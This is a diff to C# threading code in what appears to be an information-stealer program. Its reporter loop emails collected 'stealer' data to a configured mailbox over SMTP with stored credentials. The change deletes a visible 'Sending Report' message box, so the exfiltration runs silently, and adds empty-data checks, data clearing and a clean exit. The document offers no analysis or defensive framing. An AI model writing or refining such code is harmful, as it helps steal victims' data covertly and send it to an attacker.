@@ -19,20 +19,24 @@ namespace sub.Util.Threading
                                        {
                                            while (true)
                                            {
-                                               bool runOnce = _delay <= 0;
+                                               bool runOnce = _delay < 1;
                                                if (!runOnce)
                                                {
                                                    Thread.Sleep(_delay*60000);
                                                }
-                                               MessageBox.Show("Sending Report: " + stealer.Data);
-                                               new ReportEmail(stealer.Name, Settings.EmailAddress,
-                                                               Settings.EmailPassword,
-                                                               Settings.SmtpAddress, Settings.SmtpPort).Send(
-                                                                   stealer.Data);
-                                               if (runOnce)
+                                               if(!string.IsNullOrEmpty(stealer.Data))
                                                {
-                                                   _stealer.Abort();
-                                                   _reporter.Abort();
+                                                   new ReportEmail(stealer.Name, Settings.EmailAddress,
+                                                                   Settings.EmailPassword,
+                                                                   Settings.SmtpAddress, Settings.SmtpPort).Send(
+                                                                       stealer.Data);
+                                                   stealer.Data = null;
+                                                   if (runOnce)
+                                                   {
+                                                       _stealer.Abort();
+                                                       _reporter.Abort();
+                                                       break;
+                                                   }
                                                }
                                            }
                                        });
